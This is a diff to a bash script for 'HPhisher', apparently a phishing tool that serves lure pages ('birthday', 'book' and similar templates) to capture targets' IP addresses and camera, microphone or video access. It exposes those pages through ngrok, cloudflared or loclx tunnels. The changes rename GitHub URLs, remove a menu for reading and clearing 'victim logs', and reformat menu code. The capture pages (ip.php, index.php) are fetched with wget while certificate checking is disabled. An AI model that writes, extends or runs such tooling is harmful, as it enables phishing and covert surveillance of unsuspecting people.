@@ -542,14 +542,14 @@ setup_site() {
 	if [ -e ".sites/ip.php" ]; then
 		cp .sites/ip.php .sites/"$website"/* .server/www
 	else
-		wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/NPhisher/main/.sites/ip.php
+		wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/HPhisher/main/.sites/ip.php
 		mv ip.php .sites
 		cp .sites/ip.php .sites/"$website"/* .server/www
 	fi
 	if [ -e ".sites/index.php" ]; then
 		cp .sites/index.php .sites/"$website"/* .server/www
 	else
-		wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/NPhisher/main/.sites/index.php
+		wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/HPhisher/main/.sites/index.php
 		mv index.php .sites
 		cp .sites/index.php .sites/"$website"/* .server/www
 	fi
@@ -943,56 +943,6 @@ check_netstats() {
 		netstats="Offline"
 	fi
 }
-#Logs check
-logs_check() {
-	if [ -z "$(ls -A $DIR)" ]; then
-		logs_menu
-	else
-		echo "No logs found"
-		{ sleep 1; clear; mainmenu; }
-	fi
-}
-logs_menu() {
-clear
-banner
-echo -e " "
-echo -e "${RED}[${WHITE}01${RED}]${ORANGE} View Logs    "
-echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Open Logs   "
-echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Reset Logs  "
-echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Back to Tunnel menu   "
-read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_menu
-
-        case $reply_logs_menu in
-                1 | 01)
-                        ls logs/
-			{ sleep 5; clear; logs_menu; };;
-                2 | 02)
-			ls logs/
-                        read -p "${RED}[${WHITE}?${RED}]${GREEN} Enter the file name without extension (.txt) : ${BLUE}"
-			if [ -f "logs/$REPLY.txt" ]; then
-				cat logs/$REPLY.txt
-			else
-				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-	                        { sleep 1; clear; logs_menu; }
-			fi;;
-                3 | 03)
-			read -p "${RED}[${WHITE}?${RED}]${GREEN} Do you want to clear every victim logs (Y/n) : ${BLUE}"
-			case $REPLY in
-        	                Y | y)
-                	                rm -rf logs
-					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
-					{ sleep 1; clear; tunnelmenu; };;
-                        	N | n)
-                                	{ clear;  logs_menu; };;
-
-	                esac;;
-                4 | 04)
-                        { sleep 1; clear; tunnelmenu; };;
-                *)
-                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; clear; logs_menu; };;
-        esac
-}
 
 mainmenu() {
 echo -e " "
@@ -1010,39 +960,36 @@ echo -e " "
 echo -e "${BLUE} [1] ${GREEN} Image ${NC}"
 echo -e "${BLUE} [2] ${GREEN} Audio ${NC}"
 echo -e "${BLUE} [3] ${GREEN} Video ${NC}"
-echo -e "${BLUE} [4] ${GREEN} Video with audio ${NC}"
+echo -e "${BLUE} [4] ${GREEN} Video & audio [BETA]${NC}"
 echo -e " "
 echo -e "${BLUE} [A] ${RED} About ${NC}"
 echo -e "${BLUE} [B] ${RED} Request A site ${NC}"
 echo -e "${BLUE} [C] ${RED} Report an Issue ${NC}"
-echo -e "${BLUE} [D] ${RED} View Logs ${NC}"
-echo -e "${BLUE} [E] ${RED} Check for Updates ${NC}"
+echo -e "${BLUE} [D] ${RED} Check for Updates ${NC}"
 echo -e "${BLUE} [00] ${RED} Exit ${NC}"
 echo -e " "
 read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
 echo " "
 case $reply_site in
-        1 | 01)
-		site_name=image
-                site_image;;
-        2 | 02)
-		site_name=audio
-                site_audio;;
+    1 | 01)
+		site_name="image"
+	    site_image;;
+    2 | 02)
+		site_name="audio"
+		site_audio;;
 	3 | 03)
-		site_name=video
-                site_video;;
+		site_name="video"
+        site_video;;
 	4 | 04)
-		site_name=video_audio
+		site_name="video_audio"
 		site_video_audio;;
 	A | a)
-		xdg-open https://github.com/HPhisher/NPhisher
+		xdg-open https://github.com/Alygnt/HPhisher
 		{ sleep 2; clear; banner; mainmenu; };;
 	B | b | C | c)
-	  	xdg-open https://github.com/HPhisher/NPhisher/issues/new
+	  	xdg-open https://github.com/Alygnt/HPhisher/issues/new
 		{ sleep 2; clear; banner; mainmenu; };;
 	D | d)
-	    logs_check;;
-	E | e)
 		check_update;;
 	0 | 00)
     		msg_exit;;
@@ -1070,20 +1017,20 @@ echo -e " "
 read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel
 
         case $reply_tunnel in
-                1 | 01)
-                        start_localhost;;
-                2 | 02)
-			install_ngrok
-			start_ngrok;;
-                3 | 03)
-			install_cloudflared
-			start_cloudflared;;
+            1 | 01)
+                start_localhost;;
+            2 | 02)
+				install_ngrok
+				start_ngrok;;
+            3 | 03)
+				install_cloudflared
+				start_cloudflared;;
            	4 | 04)
-			install_loclx
-			start_loclx;;
-                *)
-                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; tunnel_menu; };;
+				install_loclx
+				start_loclx;;
+            *)
+                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                { sleep 1; tunnel_menu; };;
         esac
 }
 
@@ -1113,7 +1060,7 @@ case $reply_template in
         site_template="default"
         tunnel_menu;;
 	2 | 02)
-	        site_template="birthday"
+	    site_template="birthday"
 		tunnel_menu;;
 	3 | 03)
 		site_template="book"
